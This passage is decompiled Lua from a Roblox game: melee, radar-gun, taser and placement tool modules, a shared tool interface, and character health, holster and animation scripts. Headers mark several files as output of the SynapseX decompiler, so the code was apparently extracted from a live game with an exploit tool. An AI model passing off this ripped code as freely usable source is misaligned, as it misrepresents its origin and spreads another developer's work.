		if inputObject.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
			self:Swing()
		end
	end)
end
function Melee:OnUnequip()
	if self.MouseEvent then
		self.MouseEvent:Disconnect()
		self.MouseEvent = nil
	end
end
function Melee:Swing()
	if not self.Debounce then
		self.Debounce = true
		self:TriggerEffect({
			self.SwingSound
		})
		do
			local swingTrack = self:MakeTrack(self.Animations.Swing)
			table.insert(self.CurrentAnimations, swingTrack)
			local ready = true
			swingTrack.KeyframeReached:connect(function(keyframeName)
				if keyframeName == "End" then
					swingTrack:Stop(0)
					swingTrack:Destroy()
					ready = false
				end
			end)
			swingTrack:Play(0)
			local damageDebounce = false
			local function OnHit(hit)
				if not damageDebounce and ready then
					damageDebounce = true
					local humanoid = hit.Parent:FindFirstChild("Humanoid")
					if humanoid and humanoid ~= self.Humanoid or self.Smash and CollectionService:HasTag(hit, GLASS_TAG) and not CollectionService:HasTag(hit, IGNORE_TAG) then
						self.FireRemote:Fire(self.Tool, {
							{hit}
						})
						wait(DAMAGE_COOLDOWN)
					end
					damageDebounce = false
				end
			end
			local hitConn
			hitConn = self.HitPart.Touched:Connect(function(hit)
				OnHit(hit)
			end)
			for i, v in pairs(self.HitPart:GetTouchingParts()) do
				OnHit(v)
			end
			for i, v in pairs(self.HitPart:GetTouchingParts()) do
				if v.Parent ~= self.Tool then
					OnHit(v)
				end
			end
			wait(DEBOUNCE_TIME)
			hitConn:Disconnect()
			self.Debounce = false
		end
	end
end
return Melee

        toolhandler.misc
        --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local Misc = {}
Misc.__index = Misc
setmetatable(Misc, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CollectionService = game:GetService("CollectionService")
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local ToolHandler = require(script.Parent)
local DEBOUNCE_TIME = 0.5
local DAMAGE_COOLDOWN = 0.15
local GLASS_TAG = "Glass"
local IGNORE_TAG = "Ignore"
local player = Players.LocalPlayer
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function Misc.new(tool, id, humanoid, gui)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, Misc)
	self.Debounce = false
	return self
end
function Misc:OnEquip()
	if not self.ItemTable.NoSwing then
		self.MouseEvent = UserInputService.InputBegan:connect(function(inputObject, processed)
			if inputObject.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
				self:Swing()
			end
		end)
	end
end
function Misc:OnUnequip()
	if self.MouseEvent then
		self.MouseEvent:Disconnect()
		self.MouseEvent = nil
	end
end
function Misc:Swing()
	if not self.Debounce then
		self.Debounce = true
		self:TriggerEffect({
			self.SwingSound
		})
		do
			local swingTrack = self:MakeTrack(self.Animations.Swing)
			table.insert(self.CurrentAnimations, swingTrack)
			local ready = true
			swingTrack.KeyframeReached:connect(function(keyframeName)
				if keyframeName == "End" then
					swingTrack:Stop(0)
					swingTrack:Destroy()
					ready = false
				end
			end)
			swingTrack:Play(0)
			wait(DEBOUNCE_TIME)
			self.Debounce = false
		end
	end
end
return Misc

        toolhandler.ploppabletool
        --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local PloppableTool = {}
PloppableTool.__index = PloppableTool
setmetatable(PloppableTool, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local KeyBinder = require(script.Parent.Parent.KeyBinder)
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local Ploppables = require(ReplicatedStorage.Databases.Ploppables)
local ROTATE_INCREMENT = 30
local PLOP_COOLDOWN = 0.25
local player = Players.LocalPlayer
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local setPlop = RemoteHandler.Event.new("SetPlop")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local function Raycast(originPos, ignoreList)
	local hit, pos, sur = FindPartOnRayWithIgnoreList(workspace, RAY(originPos, V3(0, -8, 0)), ignoreList, false, true)
	return hit, pos, sur
end
local function IgnoreList(char, otherItem)
	local def = {
		char,
		workspace.InvisibleParts,
		workspace.Ploppables,
		otherItem
	}
	for _, p in pairs(Players:GetPlayers()) do
		if p.Character then
			INSERT(def, p.Character)
		end
	end
	return def
end
function PloppableTool.new(tool, id, humanoid, gui)
	local self = ToolInterface.new(tool, "PloppableTool", humanoid, gui)
	setmetatable(self, PloppableTool)
	self.PlopType = id
	self.Properties = Ploppables[self.PlopType]
	self.Name = self.Properties.Name
	self.RotateDeg = -90
	self.RayClone = self.Properties.Asset:Clone()
	self.RayClone.PrimaryPart.Transparency = 1
	for i, v in pairs(self.RayClone:GetChildren()) do
		if v:IsA("BasePart") then
			v.CanCollide = false
		end
	end
	self.Debounce = false
	return self
end
function PloppableTool:OnEquip()
	self:UpdateButtons()
	self.Heartbeat = RunService.Heartbeat:Connect(function()
		if self.Equipped then
			local frontPos = (self.Torso.CFrame * CF(0, 0, -5)).p
			local hit, pos, sur = Raycast(frontPos, IgnoreList(self.Character))
			if hit then
				self.RayClone.Parent = workspace.InvisibleParts
				local origCFrame = CF(pos, pos + sur) * CFANG(RAD(-90), 0, 0) * CF(0, -0.2, 0)
				local lookVector = CF(pos, pos + self.Torso.CFrame.lookVector)
				self.RayClone:SetPrimaryPartCFrame(origCFrame * (lookVector - lookVector.p) * CFANG(0, RAD(self.RotateDeg), 0))
			else
				self.RayClone.Parent = nil
			end
		else
			self.RayClone.Parent = nil
		end
	end)
end
function PloppableTool:OnUnequip()
	if self.Heartbeat then
		self.Heartbeat:Disconnect()
		self.Heartbeat = nil
	end
	self.RayClone.Parent = nil
	self:UpdateButtons()
end
function PloppableTool:Plop(inputObject)
	if self.RayClone.Parent and not self.Debounce then
		setPlop:Fire(self.PlopType, self.RayClone.PrimaryPart.CFrame)
		self.Debounce = true
		delay(PLOP_COOLDOWN, function()
			self.Debounce = false
			self:UpdateButtons()
		end)
		self:UpdateButtons()
	end
end
function PloppableTool:Rotate(right)
	self.RotateDeg = self.RotateDeg + (right and -ROTATE_INCREMENT or ROTATE_INCREMENT)
end
function PloppableTool:UpdateButtons()
	local function PlopModel(inputObject)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self:Plop()
		end
	end
	local function RotateModel(inputObject, right)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self:Rotate(right)
		end
	end
	if self.Equipped and not self.Debounce then
		if not self.PlopKey and not self.LeftKey then
			self.PlopKey = KeyBinder.KeyAction.new("Plop", "Plop " .. self.Name, {
				Enum.KeyCode.R
			}, PlopModel)
			self.LeftKey = KeyBinder.KeyAction.new("LeftRotate", "Rotate Left", {
				Enum.KeyCode.Q
			}, function(inputObject)
				RotateModel(inputObject, false)
			end)
			self.RightKey = KeyBinder.KeyAction.new("RightRotate", "Rotate Right", {
				Enum.KeyCode.E
			}, function(inputObject)
				RotateModel(inputObject, true)
			end)
		end
	else
		if self.PlopKey then
			self.PlopKey:Remove()
			self.PlopKey = nil
		end
		if self.LeftKey then
			self.LeftKey:Remove()
			self.LeftKey = nil
		end
		if self.RightKey then
			self.RightKey:Remove()
			self.RightKey = nil
		end
	end
end
return PloppableTool

  toolhandler.radargun
  --SynapseX Decompiler

local ToolInterface = require(script.Parent.ToolInterface)
local RadarGun = {}
RadarGun.__index = RadarGun
setmetatable(RadarGun, ToolInterface)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CollectionService = game:GetService("CollectionService")
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local KeyBinder = require(script.Parent.Parent.KeyBinder)
local ToolHandler = require(script.Parent)
local Assets = require(ReplicatedStorage.Databases.Assets)
local GLASS_TAG = "Glass"
local IGNORE_TAG = "Ignore"
local BEEP_BETWEEN = 1
local MPH_MULTIPLIER = 0.681818
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local function Raycast(originPos, endPos, ignoreList, range)
	local directionVec = (endPos - originPos).unit
	local hit, pos, sur = FindPartOnRayWithIgnoreList(workspace, RAY(originPos, directionVec * range), ignoreList, false, true)
	return hit, pos, sur
end
local function IgnoreList(char)
	local tags = CollectionService:GetTagged(IGNORE_TAG)
	for _, v in ipairs(CollectionService:GetTagged(GLASS_TAG)) do
		table.insert(tags, v)
	end
	table.insert(tags, char)
	table.insert(tags, workspace.Ploppables)
	table.insert(tags, workspace.InvisibleParts)
	return tags
end
function RadarGun.new(tool, id, humanoid, gui)
	local self = ToolInterface.new(tool, id, humanoid, gui)
	setmetatable(self, RadarGun)
	self.ParentGui = gui
	self.Gui = ReplicatedStorage.UI.RadarFrame:Clone()
	self.Barrel = self.Tool:WaitForChild("Barrel")
	self.Speed = 0
	self.TargetSpeed = 30
	self.Debounce = false
	self.LastSound = tick()
	self.LastMove = tick()
	self:UpdateGui()
	return self
end
function RadarGun:OnEquip()
	self:UpdateButtons()
	self.Heartbeat = RunService.Heartbeat:Connect(function()
		if self.Equipped then
			local hit, pos, sur = Raycast(self.Barrel.Position, mouse.Hit.p, IgnoreList(player.Character), 600)
			local newSpeed = (hit and hit.Velocity.Magnitude or 0) * MPH_MULTIPLIER
			self.Speed = newSpeed > 0 and newSpeed or self.Speed
			self.LastMove = newSpeed > 0 and tick() or self.LastMove
			if newSpeed >= self.TargetSpeed and tick() - self.LastSound >= BEEP_BETWEEN then
				self.LastSound = tick()
				self:TriggerEffect({
					self.BeepSound
				})
			end
			if tick() - self.LastMove >= 5 then
				self.Speed = 0
			end
			self:UpdateGui()
		end
	end)
end
function RadarGun:OnUnequip()
	if self.Heartbeat then
		self.Heartbeat:Disconnect()
		self.Heartbeat = nil
	end
	self:UpdateButtons()
end
function RadarGun:UpdateGui()
	local spe = self.Gui:WaitForChild("SpeLabel")
	self.Gui:WaitForChild("TarLabel").Text = self.TargetSpeed
	spe.Text = math.clamp(math.floor(self.Speed), 0, 300)
	if self.Speed >= self.TargetSpeed then
		spe.TextColor3 = Assets.Color.Red
	else
		spe.TextColor3 = Color3.new(1, 1, 1)
	end
end
function RadarGun:UpdateButtons()
	local function ChangeTarget(inputObject, inc)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self.TargetSpeed = math.clamp(self.TargetSpeed + (inc and 5 or -5), 10, 200)
		end
	end
	if self.Equipped and not self.Debounce then
		self.IncKey = KeyBinder.KeyAction.new("IncSpeed", "Increase Speed", {
			Enum.KeyCode.E
		}, function(inputObject)
			ChangeTarget(inputObject, true)
		end)
		self.DecKey = KeyBinder.KeyAction.new("DecSpeed", "Decrease Speed", {
			Enum.KeyCode.Q
		}, function(inputObject)
			ChangeTarget(inputObject)
		end)
	else
		if self.IncKey then
			self.IncKey:Remove()
			self.IncKey = nil
		end
		if self.DecKey then
			self.DecKey:Remove()
			self.DecKey = nil
		end
	end
end
return RadarGun

    toolhandler.taser
    --SynapseX Decompiler

local Firearm = require(script.Parent.Firearm)
local Taser = {}
Taser.__index = Taser
setmetatable(Taser, Firearm)
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local KeyBinder = require(script.Parent.Parent.KeyBinder)
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local ToolHandler = require(script.Parent)
local Tweening = require(script.Parent.Parent.Tweening)
local DynamicArms = require(script.Parent.Parent.DynamicArms)
local InventoryController = require(script.Parent.Parent.InventoryController)
local Assets = require(ReplicatedStorage.Databases.Assets)
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local addItem = Debris.AddItem
local taserRemove = RemoteHandler.Event.new("TaserEvent")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function Taser.new(tool, id, humanoid, gui)
	local self = Firearm.new(tool, id, humanoid, gui, true)
	setmetatable(self, Taser)
	return self
end
function Taser:OnEquip()
	self:UpdateGui()
	self.GunCursor = Assets.GunCursor
	self.AimCursor = Assets.AimCursor
	mouse.Icon = self.GunCursor
	self.InventoryConn = InventoryController.OnEdit:Connect(function()
		self:UpdateGui()
	end)
	self.InventoryConnEdit = InventoryController.OnUpdate:Connect(function()
		self:UpdateGui()
	end)
	self.ReloadKey = KeyBinder.KeyAction.new("Reload", "Reload", {
		Enum.KeyCode.R
	}, function(inputObject)
		if inputObject.UserInputState == Enum.UserInputState.End then
			self:RemoveWire()
			self:Reload()
		end
	end)
	self.MouseEvent = UserInputService.InputBegan:connect(function(inputObject, processed)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
			self:Fire(mouse)
		elseif inputObject.UserInputType == Enum.UserInputType.MouseButton2 and not processed and self.Ready then
			self:Aim(true)
		end
	end)
	self.MouseEventEnd = UserInputService.InputEnded:connect(function(inputObject, processed)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton2 and not processed then
			self:Aim(false)
		end
	end)
	if not self.Ready and not self.ReadyDebounce then
		self.ReadyDebounce = true
		wait(0.5)
		self.Ready = true
		self.ReadyDebounce = false
	end
end
function Taser:OnUnequip()
	mouse.Icon = ""
	if self.ReloadKey then
		self.ReloadKey:Remove()
		self.ReloadKey = nil
	end
	if self.MouseEvent then
		self.MouseEvent:Disconnect()
		self.MouseEvent = nil
	end
	if self.MouseEventEnd then
		self.MouseEventEnd:Disconnect()
		self.MouseEventEnd = nil
	end
	if self.InventoryConn then
		self.InventoryConn:Disconnect()
		self.InventoryConn = nil
	end
	if self.InventoryConnEdit then
		self.InventoryConnEdit:Disconnect()
		self.InventoryConnEdit = nil
	end
	self:Aim(false)
end
function Taser:RemoveWire()
	if self.Wire then
		taserRemove:Fire()
		self.Wire = false
	end
end
function Taser:Fire(mouse)
	if (self.Ready or self.Reloading and not self.FireFlag) and self.AmmoReady then
		self.Ready = false
		self.FireBind:Fire()
		self.Rounds = self.Rounds - 1
		if self.Rounds <= 0 then
			self.AmmoReady = false
		end
		if self.Mag then
			InventoryController.EditAttributes(self.Mag[1], true, {
				R = self.Mag[3].R - 1
			})
		end
		self:UpdateGui()
		self:TriggerEffect({
			self.FireSound,
			self.Light
		})
		do
			local fireTrack = self:MakeTrack(self.Animations.Fire)
			table.insert(self.CurrentAnimations, fireTrack)
			fireTrack.KeyframeReached:connect(function(keyframeName)
				if keyframeName == "End" then
					fireTrack:Stop(0)
					fireTrack:Destroy()
					self.Ready = true
				elseif keyframeName == "Pump" then
					self:TriggerEffect({
						self.PumpSound
					})
				end
			end)
			fireTrack:Play(0)
			local rotY = (RANDOM() - 0.5) * self.ToolTable.Recoil / 2
			Tweening.NewRecoilTween(self.Camera, self.ToolTable.Recoil, rotY, 0.1, "outQuad")
			delay(0.1, function()
				Tweening.NewRecoilTween(self.Camera, -self.ToolTable.Recoil, -rotY, 0.2, "outQuad")
			end)
			local mousePos = mouse.Hit.p
			local distance = (self.Barrel.Position - mousePos).Magnitude
			local humanoidHit = false
			local spread = self.ToolTable.Spread / 50 * distance
			local endPos = V3(mousePos.x + (RANDOM() * (spread * 2) - spread), mousePos.y + (RANDOM() * (spread * 2) - spread), mousePos.z + (RANDOM() * (spread * 2) - spread))
			local originPos = (self.Torso.CFrame * CF(0, 1.5, 0)).p
			local hit, position, sur = self:Raycast(originPos, endPos, self:GetIgnoreList(self.Character), self.ToolTable.Range)
			local hum
			if hit then
				hum = hit.Parent:FindFirstChild("Humanoid")
			end
			self.FireRemote:Fire(self.Tool, {
				{
					hit,
					position,
					sur
				}
			})
			if hit and not hum then
				ToolHandler.SpawnToolFire(hit, position, sur)
			end
			if hum then
				self.Wire = true
				do
					local hitTick = tick()
					self.LastMarker = hitTick
					self.GunCursor = Assets.GunMarker
					self.AimCursor = Assets.AimMarker
					self:UpdateCursor()
					local hitSound = Instance.new("Sound")
					hitSound.SoundId = Assets.HitMarkerSound
					hitSound.Volume = 0.5
					hitSound.Parent = self.ParentGui
					hitSound:Play()
					delay(0.5, function()
						if hitTick == self.LastMarker then
							self.GunCursor = Assets.GunCursor
							self.AimCursor = Assets.AimCursor
							self:UpdateCursor()
						end
						hitSound:Destroy()
					end)
				end
			end
		end
	elseif self.Ready and not self.AmmoReady then
		self.Ready = false
		self:TriggerEffect({
			self.EmptySound
		})
		wait(0.1)
		self.Ready = true
	end
end
return Taser

        toolhandler.toolinterface
        --SynapseX Decompiler

local ToolInterface = {}
ToolInterface.__index = ToolInterface
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Soundscape = game:GetService("SoundService")
local Players = game:GetService("Players")
local CollectionService = game:GetService("CollectionService")
local RemoteHandler = require(script.Parent.Parent.RemoteHandler)
local AnimationController = require(script.Parent.Parent.AnimationController)
local Tools = require(ReplicatedStorage.Databases.Tools)
local Assets = require(ReplicatedStorage.Databases.Assets)
local Items = require(ReplicatedStorage.Databases.Items)
local GLASS_TAG = "Glass"
local GLASS_SMASH_TAG = "Ignore"
local player = Players.LocalPlayer
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
function ToolInterface.new(tool, id, humanoid, gui)
	local self = {}
	setmetatable(self, ToolInterface)
	self.Id = id
	self.Tool = tool
	self.Screen = gui
	self.ItemTable = id and Items[self.Id]
	self.ToolTable = id and Tools[self.Id] or nil
	self.AssetTable = id and self.ItemTable and Assets.Tools[self.ItemTable.Asset] or nil
	self.LastEquip = tick()
	self.Name = self.ItemTable and self.ItemTable.Name
	self.GripR = humanoid.Parent:WaitForChild("ToolGrip"):WaitForChild("Tool")
	self.Effects = ReplicatedStorage.Effects
	self.EffectRemote = RemoteHandler.Event.new("ToolEffect")
	if self.AssetTable then
		if self.AssetTable.Sound then
			for i, v in pairs(self.AssetTable.Sound) do
				local sound = Instance.new("Sound")
				sound.Looped = false
				sound.SoundId = v[1]
				sound.SoundGroup = v[3] and Soundscape[v[3]]
				sound.Parent = self.Tool:WaitForChild(v[2])
				sound.Name = i
				if v[4] then
					sound.MinDistance = v[4][1]
					sound.MaxDistance = v[4][2]
				end
				self[i .. "Sound"] = sound
			end
		end
		if self.AssetTable.Light then
			local light = self.AssetTable.Light[2]:Clone()
			light.Parent = self.Tool:WaitForChild(self.AssetTable.Light[1])
			self.Light = light
		end
		if self.AssetTable.Smoke then
			local smoke = self.AssetTable.Smoke[2]:Clone()
			smoke.Parent = self.Tool:WaitForChild(self.AssetTable.Smoke[1])
			self.Smoke = smoke
		end
	end
	self.Character = player.Character
	self.Humanoid = humanoid
	self.Torso = humanoid and humanoid.Torso
	self.RigType = humanoid and (humanoid.RigType == Enum.HumanoidRigType.R6 and "R6" or "R15")
	if self.AssetTable and self.AssetTable.Animation then
		self.Animations = self.AssetTable.Animation[self.RigType]
	end
	self.Root = self.Tool and self.Tool:FindFirstChild("Root")
	self.ArmAttach = self.RigType == "R6" and "Right Arm" or "RightHand"
	self.AttachCF = self.RigType == "R6" and CFrame.new(0, -1, -0.75) or CFrame.new(0, -0.15, -0.75)
	self.Equipped = false
	self.CurrentAnimations = {}
	return self
end
function ToolInterface:Equip()
	self.Tool.Parent = player.Character
	local thisEquip = tick()
	self.LastEquip = thisEquip
	if self.Tool and self.Tool.Parent and self.Character and self.Character:FindFirstChild(self.ArmAttach) then
		self.Equipped = true
		if self.Id ~= "PloppableTool" then
			local motor = Instance.new("Motor6D")
			motor.Name = "ToolGrip"
			motor.Part0 = self.Character[self.ArmAttach]
			motor.Part1 = self.Root
			motor.C0 = self.AttachCF * CFrame.Angles(math.rad(-90), 0, 0)
			motor.Parent = self.Character[self.ArmAttach]
			self.ToolGrip = motor
			table.insert(self.CurrentAnimations, AnimationController.new(self.Humanoid, self.Animations.Hold, (not self.ItemTable or not self.ItemTable.NoDelay) and 0.5))
			self.GripR:FireServer(self.Tool, true)
		end
		if self.Gui and self.ParentGui then
			self.Gui.Parent = self.ParentGui
		end
		if self.ItemTable and self.ItemTable.NoDelay then
			self:OnEquip()
			return true
		else
			delay(0.5, function()
				if thisEquip == self.LastEquip then
					self:OnEquip()
				end
			end)
			return true
		end
	end
end
function ToolInterface:Unequip()
	self.Tool.Parent = player.Backpack
	self.Equipped = false
	local thisEquip = tick()
	self.LastEquip = thisEquip
	if self.ToolGrip then
		self.ToolGrip:Destroy()
	end
	for i, v in pairs(self.CurrentAnimations) do
		v:Stop(0.1)
		if v.ClassName ~= "CustAnimation" then
			v:Destroy()
		end
	end
	self.CurrentAnimations = {}
	self.GripR:FireServer(self.Tool, false)
	if self.Gui then
		self.Gui.Parent = nil
	end
	self:OnUnequip()
end
function ToolInterface:Raycast(originPos, endPos, ignoreList, range)
	local directionVec = (endPos - originPos).unit
	return FindPartOnRayWithIgnoreList(workspace, RAY(originPos, directionVec * range), ignoreList, false, true)
end
function ToolInterface:GetIgnoreList(char, otherItem)
	local def = CollectionService:GetTagged(GLASS_SMASH_TAG)
	INSERT(def, char)
	INSERT(def, workspace.InvisibleParts)
	INSERT(def, otherItem)
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= player and p.Character then
			for _, v in pairs(p.Character:GetChildren()) do
				if v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.ClassName == "Configuration" then
					INSERT(def, v)
				end
			end
		end
	end
	return def
end
function ToolInterface:Remove()
	if self.Tool.Parent then
		self.Tool.Parent = ReplicatedStorage
		self.Tool:Destroy()
	end
	self = nil
end
function ToolInterface:TriggerEffect(effectTable)
	local sendTable = {}
	for i, v in ipairs(effectTable) do
		if v.ClassName == "Sound" then
			v:Play()
		elseif v:IsA("SpotLight") or v:IsA("ParticleEmitter") then
			spawn(function()
				v.Enabled = true
				wait(0.05)
				v.Enabled = false
			end)
		end
		table.insert(sendTable, {
			v.Name,
			v.ClassName
		})
	end
	self.EffectRemote:Fire(self.Tool, sendTable)
end
function ToolInterface:MakeTrack(id)
	local animation = Instance.new("Animation")
	animation.AnimationId = id
	local track = self.Humanoid:LoadAnimation(animation)
	animation:Destroy()
	return track
end
return ToolInterface

    startercharacterscripts.health
    -- Gradually regenerates the Humanoid's Health over time.

local REGEN_RATE = 0.35/100 -- Regenerate this fraction of MaxHealth per second.
local REGEN_STEP = 1 -- Wait this long between each regeneration step.

--------------------------------------------------------------------------------

local Character = script.Parent
local Humanoid = Character:WaitForChild'Humanoid'

--------------------------------------------------------------------------------

while true do
	while Humanoid.Health < Humanoid.MaxHealth do
		local dt = wait(REGEN_STEP)
		local dh = dt*REGEN_RATE*Humanoid.MaxHealth
		Humanoid.Health = math.min(Humanoid.Health + dh, Humanoid.MaxHealth)
	end
	Humanoid.HealthChanged:Wait()
end

      startercharacterscripts.toolgrip
local LocalPlayer = game:GetService("Players"):GetPlayerFromCharacter(script.Parent)
repeat wait() until LocalPlayer.CharacterAppearanceLoaded
local Items = require(game:GetService("ReplicatedStorage").Databases.Items)
local Player = game:GetService("Players"):FindFirstChild(script.Parent.Name)

local function IsPlayersTool(Player, Tool)
	if Player.Backpack:FindFirstChild(Tool) or Player.Character:FindFirstChild(Tool) then
		return true
	else
		return false
	end
end

Player.Backpack.ChildAdded:Connect(function(Object)
	if Object:FindFirstChild("Class") then
		coroutine.wrap(function()
		local Class = Object.Class.Value
		local Holsters = game:GetService("ReplicatedStorage").Holsters
		local Items = require(game.ReplicatedStorage.Databases.Items)
		local Item = Items[Class]
		local ClassVest = {"ASPSVest","NerfNStrikeVest","Roblox Ninja Vest","NGWebbingVest","SOBVest","PoliceVest","SheriffVest","WarrantBureauVest","TrooperVest","PlymouthPlateVest","LanderPlateVest"}
		local ClassDuty = {"ASPSBelt","BaseDutyBelt","PAWDutyBelt","MSPBaseDutyBelt","MSPDutyBelt"}
		local Set = nil
		if Item.Holster then
			for i, HolsterSet in pairs(Item.Holster) do
				if HolsterSet[3] then
					if Player.Character:FindFirstChild(HolsterSet[3]) then
						Set = {}
						for i, v in pairs(HolsterSet)
						do
							if not Player.Character:FindFirstChild(v) then
								table.insert(Set, v)
							end
						end
					end
					if HolsterSet[3] == "Vest" then
						for i, v in pairs(ClassVest)
						do
							if Player.Character:FindFirstChild(v) then	
								Set = {}
								for i, v in pairs(HolsterSet)
								do
									if not Player.Character:FindFirstChild(v) then
										table.insert(Set, v)
									end
								end
							end
						end

					end
					if HolsterSet[3] == "DutyBelt" then
						for i, v in pairs(ClassDuty)
						do
							if Player.Character:FindFirstChild(v) then	
								Set = {}
								for i, v in pairs(HolsterSet)
								do
									if not Player.Character:FindFirstChild(v) then
										table.insert(Set, v)
									end
								end
							end
						end

					end
				else
					if Set == nil then
						Set = {}
						for i, v in pairs(HolsterSet)
						do
							if not Player.Character:FindFirstChild(v) then
								table.insert(Set, v)
							end
						end
					end
				end
			end
		end
		if Set ~= nil then
			for i, v in pairs(Set) do
				if v ~= nil and v ~= false and v ~= "DutyBelt" and v ~= "BaseDutyBelt" and v ~= "Vest" then
					local C = Holsters:FindFirstChild(v):Clone()
					C.Parent = Player.Character
					end
				end
			end
		end)()
	end
end)

Player.Backpack.ChildRemoved:Connect(function(Object)
	coroutine.wrap(function()
	local Class = Object.Class.Value
	local Holsters = game:GetService("ReplicatedStorage").Holsters
	local Items = require(game.ReplicatedStorage.Databases.Items)
	local Item = Items[Class]
	if Player.Character:FindFirstChild(Object.Name) then
		if Item.Holster then
			for i, HolsterSet in pairs(Item.Holster) do
				if HolsterSet[1] then
					if Player.Character:FindFirstChild(HolsterSet[1]) then
						Player.Character:FindFirstChild(HolsterSet[1]):Destroy()
					end
				end
			end
		end
	else
		if Item.Holster then
			for i, HolsterSet in pairs(Item.Holster) do
				for i, v in pairs(HolsterSet) do
					if Player.Character:FindFirstChild(v) and v ~= "Vest" and v ~= "DutyBelt" and v ~= "BaseDutyBelt"
					then
						Player.Character:FindFirstChild(v):Destroy()
						end
					end	
				end
			end
		end
	end)()
end)

script.Tool.OnServerEvent:Connect(function(player, tool, bool)
	if tool and tool:IsA("Configuration") then
		if not IsPlayersTool(player, tool.Name) then
			return
		end
		coroutine.wrap(function()
		local Character = player.Character
		local Humanoid = Character:FindFirstChild("Humanoid")
		local Torso = Humanoid and Humanoid.Torso
		local RigType = Humanoid and (Humanoid.RigType == Enum.HumanoidRigType.R6 and "R6" or "R15")
		local Root = tool and tool:FindFirstChild("Root")
		local ArmAttach = RigType == "R6" and "Right Arm" or "RightHand"
		local AttachCF = RigType == "R6" and CFrame.new(0, -1, -0.75) or CFrame.new(0, -0.15, -0.75)
		if bool == true then
			if not Character:FindFirstChildOfClass("Configuration") then				
				pcall(function()
					tool.Parent = player.Character
					local motor = Instance.new("Motor6D")
					motor.Name = "ToolGrip"
					motor.Part0 = Character[ArmAttach]
					motor.Part1 = Root
					motor.C0 = AttachCF * CFrame.Angles(math.rad(-90), 0, 0)
					motor.Parent = Character[ArmAttach]
				end)
			end
		elseif bool == false then
			if tool.Class.Value ~= "Handcuffs" then
				pcall(function()
					tool.Parent = player.Backpack
					if Character[ArmAttach]:FindFirstChild("ToolGrip") then
						Character[ArmAttach]:FindFirstChild("ToolGrip"):Destroy()
						end
					end)
				end
			end
		end)()
	end
end)
      startercharacterscripts.animate
  pcall(function()
local Figure = script.Parent
local Torso = Figure:WaitForChild("Torso")
local RightShoulder = Torso:WaitForChild("Right Shoulder")
local LeftShoulder = Torso:WaitForChild("Left Shoulder")
local RightHip = Torso:WaitForChild("Right Hip")
local LeftHip = Torso:WaitForChild("Left Hip")
local Neck = Torso:WaitForChild("Neck")
local Humanoid = Figure:WaitForChild("Humanoid")
local pose = "Standing"

local currentAnim = ""
local currentAnimInstance = nil
local currentAnimTrack = nil
local currentAnimKeyframeHandler = nil
local currentAnimSpeed = 1.0
local animTable = {}
local animNames = { 
	idle = 	{	
				{ id = "http://www.roblox.com/asset/?id=180435571", weight = 9 },
				{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
			},
	walk = 	{ 	
				{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
			}, 
	run = 	{
				{ id = "run.xml", weight = 10 } 
			}, 
	jump = 	{
				{ id = "http://www.roblox.com/asset/?id=125750702", weight = 10 } 
			}, 
	fall = 	{
				{ id = "http://www.roblox.com/asset/?id=180436148", weight = 10 } 
			}, 
	climb = {
				{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
			}, 
	sit = 	{
				{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
			},	
	toolnone = {
				{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
			},
